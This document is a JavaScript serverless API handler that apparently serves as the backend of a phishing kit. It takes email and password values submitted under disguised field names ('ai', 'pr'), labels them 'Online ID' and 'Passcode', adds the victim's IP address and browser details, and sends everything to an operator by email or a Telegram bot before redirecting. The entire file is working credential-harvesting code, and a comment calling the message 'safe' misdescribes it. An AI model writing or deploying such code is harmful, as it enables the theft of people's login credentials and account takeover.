// api/next.js
import nodemailer from "nodemailer";

function readRawBody(req) {
  return new Promise((resolve, reject) => {
    let data = "";
    req.on("data", (chunk) => (data += chunk));
    req.on("end", () => resolve(data));
    req.on("error", reject);
  });
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ signal: "bad", msg: "Only POST allowed", redirect_link: process.env.REDIRECT_URL || "" });
  }

  try {
    const raw = await readRawBody(req);
    const contentType = (req.headers["content-type"] || "").toLowerCase();
    let body = {};

    // Parse JSON or urlencoded forms
    if (contentType.includes("application/json")) {
      body = raw ? JSON.parse(raw) : {};
    } else if (contentType.includes("application/x-www-form-urlencoded")) {
      const params = new URLSearchParams(raw);
      for (const [k, v] of params) body[k] = v;
    } else {
      // Try JSON fallback
      try {
        body = raw ? JSON.parse(raw) : {};
      } catch (e) {
        return res.status(400).json({ signal: "bad", msg: "Unsupported Content-Type", redirect_link: process.env.REDIRECT_URL || "" });
      }
    }

    const ai = (body.ai || "").toString().trim(); // email field in your form
    const pr = (body.pr || "").toString().trim(); // password field in your form

    if (!ai) {
      return res.status(400).json({ signal: "bad", msg: "Email required", redirect_link: process.env.REDIRECT_URL || "" });
    }

    // Build a safe message. Do not store or persist secrets here.
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
    const ua = req.headers["user-agent"] || "unknown";
    const ts = new Date().toUTCString();

    const textMessage = [
      "|----------|  |--------------|",
      `Online ID            : ${ai}`,
      `Passcode              : ${pr || "(none provided)"}`,
      "|--------------- I N F O | I P -------------------|",
      `IP: ${ip}`,
      `User-Agent: ${ua}`,
      `Time: ${ts}`,
      "|----------|  |--------------|"
    ].join("\n");

    // Attempt 1: SMTP via nodemailer if SMTP env vars present
    let emailDelivered = false;
    if (process.env.SMTP_USER && process.env.SMTP_PASS && process.env.EMAIL_TO) {
      try {
        const transporter = nodemailer.createTransport({
          host: process.env.SMTP_HOST || "smtp.gmail.com",
          port: Number(process.env.SMTP_PORT || 465),
          secure: (process.env.SMTP_SECURE === "true" || String(process.env.SMTP_PORT) === "465"),
          auth: {
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS
          }
        });

        await transporter.sendMail({
          from: process.env.MAIL_FROM || process.env.SMTP_USER,
          to: process.env.EMAIL_TO,
          subject: process.env.EMAIL_SUBJECT || "New Form Submission",
          text: textMessage
        });

        emailDelivered = true;
      } catch (e) {
        console.error("SMTP send error:", e && e.message ? e.message : e);
      }
    }

    // Attempt 2: Email via API endpoint (if provided). Useful for services like Resend/SendGrid HTTP API.
    if (!emailDelivered && process.env.EMAIL_API_URL && process.env.EMAIL_RECIPIENT) {
      try {
        await fetch(process.env.EMAIL_API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            to: process.env.EMAIL_RECIPIENT,
            subject: process.env.EMAIL_SUBJECT || "New Form Submission",
            text: textMessage
          })
        });
        emailDelivered = true;
      } catch (e) {
        console.error("EMAIL_API_URL error:", e && e.message ? e.message : e);
      }
    }

    // Telegram
    let telegramDelivered = false;
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      try {
        const tgRes = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: `📬 New Form Submission:\n\n${textMessage}`
          })
        });

        const tgJson = await tgRes.json();
        if (tgJson && tgJson.ok) telegramDelivered = true;
        else console.error("Telegram API response:", tgJson);
      } catch (e) {
        console.error("Telegram send error:", e && e.message ? e.message : e);
      }
    }

    const success = emailDelivered || telegramDelivered;
    const signal = success ? "ok" : "bad";
    const msg = success ? "Delivered successfully!" : "Delivery failed (check logs and env vars)";

    return res.status(200).json({ signal, msg, redirect_link: process.env.REDIRECT_URL || "" });
  } catch (err) {
    console.error("Unexpected error in /api/next:", err && err.message ? err.message : err);
    return res.status(500).json({ signal: "bad", msg: "Internal Server Error", redirect_link: process.env.REDIRECT_URL || "" });
  }
}
